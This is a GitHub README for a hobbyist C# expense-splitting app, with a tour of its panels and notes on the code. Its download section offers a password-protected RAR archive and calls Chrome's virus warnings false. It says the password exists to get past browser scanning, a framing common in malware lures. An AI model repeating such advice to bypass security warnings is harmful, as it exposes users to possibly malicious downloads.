# Money-Parallel
Money Parallel is my little (and first full) coding project. It's an app where you can organize your expenses. Let me make you a quick tour: first of all you create a group, then once created you save your expenses. Whenever you want you can see the total debt of each member to split money in equal parts and other features.

- [DownLoads Latest Version](#download-latest-version)
- [Overview](#app-overview)
- [Application Code Analysis](#application-code-analysis)
- [Discalmer](#disclamer)


## Download Latest Version
Latest Version (1.0.0)
**IMPORTANT!!** 
  Chrome keeps blocking the download of the file **ON SOME DEVICES** saying that he detects some (non-existent) viruses. I repeat that this is a simple coding project. If dont trust me go to https://www.virustotal.com/gui/home/upload and upload the file, as you can see    below 0 of 68 antiviruses detect any problem. To avoid this inaccurate security test done by chrome or other browsers I had to add a password to encrypt the file. The password is "moneyapp2".
  
  <img width="1315" height="195" alt="image" src="https://github.com/user-attachments/assets/75f72e21-0f14-4379-892d-97d1cc69d9d6" />

[Download File Password : "moneyapp2"](https://github.com/SirPerryyy/Money-Parallel/raw/refs/heads/main/Money%20Parallel%201.0.0.rar)

## App Overview

Application is subdivided into 4 panels.
The Groups panel where you can create groups and select from different ones. 

<img width="277" height="481" alt="image" src="https://github.com/user-attachments/assets/120e8b59-bb03-4a0e-a6f4-70c547ae7b67" />

As you can see there's a + button. It will open the creation Form.

<img width="215" height="338" alt="image" src="https://github.com/user-attachments/assets/9c1f138a-6e70-4c33-a257-1e0aaf1daf1d" />

Insert the group name, adjust the number of members you want inside the group and hit confirm.
Then you will insert all the group members names once per time. Click next person when you're done writing it.
Then the create button will become green, meaning that you can create the group. 
>NOTE: Do not insert 2 or more names with the same string or some features wont work.
Once created close the form and hit the refresh button.
If the list populates everything went fine.

Once You created the group and select it from the groups listbox. Main interface will populate.

<img width="1090" height="466" alt="image" src="https://github.com/user-attachments/assets/c7503d8b-e201-4c1f-87a4-be3d8c24bad1" />

As you can see all the datas you have insert in the group creation panel are now displayed.

Lets Create a transation. Fisrt of all add transition name. Then the import payed and finally SELECT from the combo box who payed by clicking the little down arrow.
>NOTE: If you write who payed the app wont recognize the data so make sure to select it.
Once everything is done hit Calculate.
Transations list will populate. 
Now if you select any member from the people list it will populate the debts list. 

<img width="549" height="256" alt="image" src="https://github.com/user-attachments/assets/df9de5b3-5f77-47ae-a8a0-ebc74a450251" />

Debts are accumulated for each person to another and can be resetted by clicking clear debts.

<img width="236" height="179" alt="image" src="https://github.com/user-attachments/assets/fd7289c5-3661-4af4-82e5-2d7a2bc3ec9e" />

I think that's all. Make sure to read all the files before starting the application to avoid any issues.

Enjoy!

## Application Code Analysis

This application is born as a code challenge. I wanted to see how much I've learnt during all my courses and certifications exams i this 4 months. The app has been coded in c# based on windows form. This has been a triky but fun challenge. It conteins basic data functions such as create, delete, update, read and use that datas to execute some particular metods. It also includes try-catch patterns, and a log file where exceptions and errors are tracked complete of stack-trace, exceptions informations and messages. All the datas are saved into two separeate Json files serialized and deserialized using Newsontof.Json nuGet package.

## Disclamer
This project was made just for learning purposes. Bug reports are welcome, but please note that I don’t plan to actively maintain or expand it.

